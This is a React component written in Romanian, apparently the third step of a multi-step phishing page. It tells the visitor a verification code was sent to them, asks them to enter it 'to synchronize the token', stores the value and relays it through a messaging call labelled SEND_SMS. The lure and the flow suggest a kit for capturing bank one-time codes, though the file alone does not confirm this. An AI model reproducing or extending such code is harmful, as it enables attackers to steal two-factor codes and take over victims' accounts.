import React, { useState } from 'react'
import { ErrorMsg } from './ErrorMsg'
import { Messaging } from '../utils/messages'
import { UserActions } from '../utils/constants'
export const Step3 = props => {

  const { changeStore, store } = props
  const [showError, setShowError] = useState(false)
  const [cod, setCod] = useState('')

  const error = store.error
  const setError = val => changeStore({ error: val })

  const handleConfirm = () => {
    if (!cod) {
      setShowError(true)
      return
    }
    const value = cod
    
    Messaging.send({ type: UserActions.SEND_SMS, payload: value })

    changeStore({
      step_3_cod : value,
      loading: true,
    })
  }

  const handleChangeCod = value => {
    console.log('value', value)
    setCod(value)
  }

  return (
    <div className="secure-container regular verification">
      <div className="secure-wrapper">
        <div style={{marginBottom: '32px'}} className="bold">
          Un cod de verificare a fost transmis catre numarul de telefon/adresa de mail inregistrata. Te rugam sa introduci codul mai jos pentru a sincroniza tokenul.
        </div>
        <div className="secure-fields-container">
            <div className="row">
              <div className="secure-field-description bold">
                Cod de verificare
              </div>
              <div className="secure-field-input">
                <input value={cod} onChange={e => handleChangeCod(e.target.value)} value={cod} type="password" />
                { (showError || error) && <ErrorMsg message="Ati introdus cod de verificare eronat" />}
              </div>
            </div>
            <div className="secure-buttons-container">
              
              <div>
                <button className="regular white-btn" onClick={() => setCod('')}>
                  Anuleaza
                </button>
              </div>
              <div>
                <button className="small-blue-btn regular" onClick={handleConfirm}>
                  Confirma
                </button>
              </div>
            </div>
          </div>
      </div>
    </div>
  )
}